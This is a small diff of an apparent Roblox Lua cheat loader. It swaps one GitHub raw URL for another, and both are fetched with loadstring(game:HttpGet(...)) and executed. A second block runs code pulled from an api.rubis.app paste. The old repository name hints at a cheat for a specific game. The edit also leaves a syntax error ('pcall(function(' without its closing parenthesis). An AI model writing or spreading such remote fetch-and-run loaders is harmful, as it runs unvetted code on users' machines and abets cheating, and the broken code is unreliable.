@@ -3,11 +3,11 @@ pcall(function()
 end)
 
 pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Khangdz28/Stealabrainrot/refs/heads/main/Khngg"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Khangdz28/Class/refs/heads/main/Khnggg"))()
 end)
 
 task.wait(5)
 
-pcall(function()
+pcall(function(
     loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/EiXDbkzpkofzKowL/raw"))()
 end)
